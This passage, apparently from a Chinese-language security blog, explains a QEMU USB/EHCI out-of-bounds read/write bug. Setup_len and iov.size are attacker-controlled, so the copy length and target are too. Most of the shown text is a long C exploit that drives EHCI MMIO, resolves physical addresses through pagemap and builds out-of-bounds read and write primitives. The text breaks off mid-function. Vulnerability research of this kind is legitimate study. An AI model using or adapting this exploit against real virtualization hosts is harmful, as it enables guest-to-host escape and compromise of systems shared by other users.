class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (__builtin_constant_p(bytes) &amp;&amp; iov_cnt &amp;&amp;</span><br><span class="line">        offset &lt;= iov[<span class="number">0</span>].iov_len &amp;&amp; bytes &lt;= iov[<span class="number">0</span>].iov_len - offset) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(buf, iov[<span class="number">0</span>].iov_base + offset, bytes);</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> iov_to_buf_full(iov, iov_cnt, offset, buf, bytes);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">size_t</span></span><br><span class="line"><span class="title function_">iov_from_buf</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> iovec *iov, <span class="type">unsigned</span> <span class="type">int</span> iov_cnt,</span></span><br><span class="line"><span class="params">             <span class="type">size_t</span> offset, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> bytes)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (__builtin_constant_p(bytes) &amp;&amp; iov_cnt &amp;&amp;</span><br><span class="line">        offset &lt;= iov[<span class="number">0</span>].iov_len &amp;&amp; bytes &lt;= iov[<span class="number">0</span>].iov_len - offset) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(iov[<span class="number">0</span>].iov_base + offset, buf, bytes);</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> iov_from_buf_full(iov, iov_cnt, offset, buf, bytes);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们看到其最终是向<code>iov[0].iov_base</code>写入了数据。虽然在<code>usb_packet_copy</code>函数中写入的字节数是一个参数，但是我们看一下函数再调用中的参数的值</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> len = s-&gt;setup_len - s-&gt;setup_index;</span><br><span class="line"><span class="keyword">if</span> (len &gt; p-&gt;iov.size) &#123;</span><br><span class="line">  len = p-&gt;iov.size;</span><br><span class="line">&#125;</span><br><span class="line">usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);</span><br></pre></td></tr></table></figure>

<p>我们看到这里的<code>len</code>要么就是<code>setup_len</code>，要么就是<code>iov.size</code>。而<code>setup_len</code>是我们控制的，<code>iov.size</code>我们也可以进行控制，因此这里拷贝的长度和目标地址都是可控的。这也就是解释了为什么我们可以指定读取的目标地址和写入的源地址。</p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">USBDevice</span> <span class="title">USBDevice</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">USBEndpoint</span> <span class="title">USBEndpoint</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">USBEndpoint</span> &#123;</span></span><br><span class="line">    <span class="type">uint8_t</span> nr;</span><br><span class="line">    <span class="type">uint8_t</span> pid;</span><br><span class="line">    <span class="type">uint8_t</span> type;</span><br><span class="line">    <span class="type">uint8_t</span> ifnum;</span><br><span class="line">    <span class="type">int</span> max_packet_size;</span><br><span class="line">    <span class="type">int</span> max_streams;</span><br><span class="line">    <span class="type">bool</span> pipeline;</span><br><span class="line">    <span class="type">bool</span> halted;</span><br><span class="line">    USBDevice *dev;</span><br><span class="line">    USBEndpoint *fd;</span><br><span class="line">    USBEndpoint *bk;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">USBDevice</span> &#123;</span></span><br><span class="line">    <span class="type">int32_t</span> remote_wakeup;</span><br><span class="line">    <span class="type">int32_t</span> setup_state;</span><br><span class="line">    <span class="type">int32_t</span> setup_len;</span><br><span class="line">    <span class="type">int32_t</span> setup_index;</span><br><span class="line"></span><br><span class="line">    USBEndpoint ep_ctl;</span><br><span class="line">    USBEndpoint ep_in[<span class="number">15</span>];</span><br><span class="line">    USBEndpoint ep_out[<span class="number">15</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">EHCIqh</span> &#123;</span></span><br><span class="line">    <span class="type">uint32_t</span> next;                    <span class="comment">/* Standard next link pointer */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* endpoint characteristics */</span></span><br><span class="line">    <span class="type">uint32_t</span> epchar;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* endpoint capabilities */</span></span><br><span class="line">    <span class="type">uint32_t</span> epcap;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> current_qtd;             <span class="comment">/* Standard next link pointer */</span></span><br><span class="line">    <span class="type">uint32_t</span> next_qtd;                <span class="comment">/* Standard next link pointer */</span></span><br><span class="line">    <span class="type">uint32_t</span> altnext_qtd;         </span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> token;                   <span class="comment">/* Same as QTD token */</span></span><br><span class="line">    <span class="type">uint32_t</span> bufptr[<span class="number">5</span>];               <span class="comment">/* Standard buffer pointer */</span></span><br><span class="line"></span><br><span class="line">&#125; EHCIqh;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">EHCIqtd</span> &#123;</span></span><br><span class="line">    <span class="type">uint32_t</span> next;                    <span class="comment">/* Standard next link pointer */</span></span><br><span class="line">    <span class="type">uint32_t</span> altnext;                 <span class="comment">/* Standard next link pointer */</span></span><br><span class="line">    <span class="type">uint32_t</span> token;</span><br><span class="line">    <span class="type">uint32_t</span> bufptr[<span class="number">5</span>];               <span class="comment">/* Standard buffer pointer */</span></span><br><span class="line">&#125; EHCIqtd;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *setup_buf;</span><br><span class="line"><span class="type">char</span> *data_buf;</span><br><span class="line"><span class="type">char</span> *data_bufoob;</span><br><span class="line"><span class="type">char</span> *first_leak_data;</span><br><span class="line"><span class="type">char</span> *second_leak_data;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* mmio_mem;</span><br><span class="line"><span class="type">char</span> *dmabuf;</span><br><span class="line"><span class="type">uint32_t</span> *entry;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">EHCIqh</span> *<span class="title">qh</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">EHCIqtd</span> * <span class="title">qtd</span>;</span></span><br><span class="line"><span class="type">uint64_t</span> device_addr = <span class="number">0</span>;</span><br><span class="line"><span class="type">uint64_t</span> func_addr = <span class="number">0</span>;</span><br><span class="line"><span class="type">uint64_t</span> port_addr = <span class="number">0</span>;</span><br><span class="line"><span class="type">uint64_t</span> port_ptr = <span class="number">0</span>;</span><br><span class="line"><span class="type">uint64_t</span> data_buf_addr = <span class="number">0</span>;</span><br><span class="line"><span class="type">uint64_t</span> proc_base = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">virtuak_addr_to_physical_addr</span><span class="params">(<span class="type">void</span> *addr)</span>&#123;</span><br><span class="line">    <span class="type">uint64_t</span> data;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>,O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(!fd)&#123;</span><br><span class="line">        perror(<span class="string">&quot;open pagemap&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> pagesize = getpagesize();</span><br><span class="line">    <span class="type">size_t</span> offset = ((<span class="type">uintptr_t</span>)addr / pagesize) * <span class="keyword">sizeof</span>(<span class="type">uint64_t</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(lseek(fd,offset,SEEK_SET) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;lseek&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(read(fd,&amp;data,<span class="number">8</span>) != <span class="number">8</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(data &amp; (((<span class="type">uint64_t</span>)<span class="number">1</span> &lt;&lt; <span class="number">63</span>))))&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;page&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> pageframenum = data &amp; ((<span class="number">1ull</span> &lt;&lt; <span class="number">55</span>) - <span class="number">1</span>);</span><br><span class="line">    <span class="type">size_t</span> phyaddr = pageframenum * pagesize + (<span class="type">uintptr_t</span>)addr % pagesize;</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> phyaddr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">die</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">    *((<span class="type">uint32_t</span>*)(mmio_mem + addr)) = (value &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">    *((<span class="type">uint32_t</span>*)(mmio_mem + addr + <span class="number">4</span>)) = (value &gt;&gt; <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> value1 = *((<span class="type">uint32_t</span> *)(mmio_mem + addr));</span><br><span class="line">    <span class="type">uint32_t</span> value2 = *((<span class="type">uint32_t</span> *)(mmio_mem + addr + <span class="number">4</span>));</span><br><span class="line">    <span class="type">uint64_t</span> value =  ((<span class="type">uint64_t</span>)value2 &lt;&lt; <span class="number">32</span>) + value1;</span><br><span class="line">    <span class="comment">// return *((uint64_t*)(mmio_mem + addr));</span></span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">echi_reset</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x20</span>,<span class="number">1</span>&lt;&lt;<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_usbcmd</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    echi_reset();</span><br><span class="line">    mmio_write(<span class="number">0x20</span>,(<span class="number">1</span>&lt;&lt;<span class="number">0</span>)|(<span class="number">1</span>&lt;&lt;<span class="number">4</span>));</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_portsc</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x64</span>,<span class="number">1</span>&lt;&lt;<span class="number">8</span>);</span><br><span class="line">    mmio_write(<span class="number">0x64</span>,<span class="number">1</span>&lt;&lt;<span class="number">2</span>);</span><br><span class="line">    mmio_write(<span class="number">0x65</span>&lt;&lt;<span class="number">2</span>,<span class="number">1</span>&lt;&lt;<span class="number">8</span>);</span><br><span class="line">    mmio_write(<span class="number">0x65</span>&lt;&lt;<span class="number">2</span>,<span class="number">1</span>&lt;&lt;<span class="number">2</span>);</span><br><span class="line">    mmio_write(<span class="number">0x66</span>&lt;&lt;<span class="number">2</span>,<span class="number">1</span>&lt;&lt;<span class="number">8</span>);</span><br><span class="line">    mmio_write(<span class="number">0x66</span>&lt;&lt;<span class="number">2</span>,<span class="number">1</span>&lt;&lt;<span class="number">2</span>);</span><br><span class="line">    mmio_write(<span class="number">0x67</span>&lt;&lt;<span class="number">2</span>,<span class="number">1</span>&lt;&lt;<span class="number">8</span>);</span><br><span class="line">    mmio_write(<span class="number">0x67</span>&lt;&lt;<span class="number">2</span>,<span class="number">1</span>&lt;&lt;<span class="number">2</span>);</span><br><span class="line">    mmio_write(<span class="number">0x68</span>&lt;&lt;<span class="number">2</span>,<span class="number">1</span>&lt;&lt;<span class="number">8</span>);</span><br><span class="line">    mmio_write(<span class="number">0x68</span>&lt;&lt;<span class="number">2</span>,<span class="number">1</span>&lt;&lt;<span class="number">2</span>);</span><br><span class="line">    mmio_write(<span class="number">0x69</span>&lt;&lt;<span class="number">2</span>,<span class="number">1</span>&lt;&lt;<span class="number">8</span>);</span><br><span class="line">    mmio_write(<span class="number">0x69</span>&lt;&lt;<span class="number">2</span>,<span class="number">1</span>&lt;&lt;<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_length</span><span class="params">(<span class="type">uint64_t</span> length)</span>&#123;</span><br><span class="line"></span><br><span class="line">    setup_buf[<span class="number">6</span>] = length &amp; <span class="number">0xff</span>;</span><br><span class="line">    setup_buf[<span class="number">7</span>] = (length &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line"></span><br><span class="line">    qtd-&gt;token = (<span class="number">8</span> &lt;&lt; <span class="number">16</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">7</span>) | (<span class="number">2</span> &lt;&lt; <span class="number">8</span>);</span><br><span class="line">    qtd-&gt;bufptr[<span class="number">0</span>] = virtuak_addr_to_physical_addr(setup_buf);</span><br><span class="line"></span><br><span class="line">    qh-&gt;token = <span class="number">1</span> &lt;&lt; <span class="number">7</span>;</span><br><span class="line">    qh-&gt;current_qtd = virtuak_addr_to_physical_addr(qtd);</span><br><span class="line"></span><br><span class="line">    *entry = virtuak_addr_to_physical_addr(qh) + (<span class="number">1</span> &lt;&lt; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    set_usbcmd();</span><br><span class="line">    set_portsc();</span><br><span class="line">    mmio_write(<span class="number">0x34</span>,virtuak_addr_to_physical_addr(dmabuf));</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">perpare_read</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    setup_buf[<span class="number">0</span>] = <span class="number">0x80</span>;</span><br><span class="line">    setup_buf[<span class="number">6</span>] = <span class="number">0xff</span>;</span><br><span class="line">    setup_buf[<span class="number">7</span>] = <span class="number">0x00</span>;</span><br><span class="line"></span><br><span class="line">    qtd-&gt;token = (<span class="number">8</span> &lt;&lt; <span class="number">16</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">7</span>) | (<span class="number">2</span> &lt;&lt; <span class="number">8</span>);</span><br><span class="line">    qtd-&gt;bufptr[<span class="number">0</span>] = virtuak_addr_to_physical_addr(setup_buf);</span><br><span class="line"></span><br><span class="line">    qh-&gt;token = <span class="number">1</span> &lt;&lt; <span class="number">7</span>;</span><br><span class="line">    qh-&gt;current_qtd = virtuak_addr_to_physical_addr(qtd);</span><br><span class="line"></span><br><span class="line">    *entry = virtuak_addr_to_physical_addr(qh) + (<span class="number">1</span> &lt;&lt; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    set_usbcmd();</span><br><span class="line">    set_portsc();</span><br><span class="line">    mmio_write(<span class="number">0x34</span>,virtuak_addr_to_physical_addr(dmabuf));</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">perpare_write</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    setup_buf[<span class="number">0</span>] = <span class="number">0x00</span>;</span><br><span class="line">    setup_buf[<span class="number">6</span>] = <span class="number">0xff</span>;</span><br><span class="line">    setup_buf[<span class="number">7</span>] = <span class="number">0x00</span>;</span><br><span class="line"></span><br><span class="line">    qtd-&gt;token = (<span class="number">8</span> &lt;&lt; <span class="number">16</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">7</span>) | (<span class="number">2</span> &lt;&lt; <span class="number">8</span>);</span><br><span class="line">    qtd-&gt;bufptr[<span class="number">0</span>] = virtuak_addr_to_physical_addr(setup_buf);</span><br><span class="line"></span><br><span class="line">    qh-&gt;token = <span class="number">1</span> &lt;&lt; <span class="number">7</span>;</span><br><span class="line">    qh-&gt;current_qtd = virtuak_addr_to_physical_addr(qtd);</span><br><span class="line"></span><br><span class="line">    *entry = virtuak_addr_to_physical_addr(qh) + (<span class="number">1</span> &lt;&lt; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    set_usbcmd();</span><br><span class="line">    set_portsc();</span><br><span class="line">    mmio_write(<span class="number">0x34</span>,virtuak_addr_to_physical_addr(dmabuf));</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">oob_read</span><span class="params">(<span class="type">uint64_t</span> length,<span class="type">int</span> flag)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">        perpare_read();</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[47;31m[*] perpare read finished\033[0m&quot;</span>);</span><br><span class="line">        set_length(length);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[47;31m[*] set length finished\033[0m&quot;</span>);</span><br><span 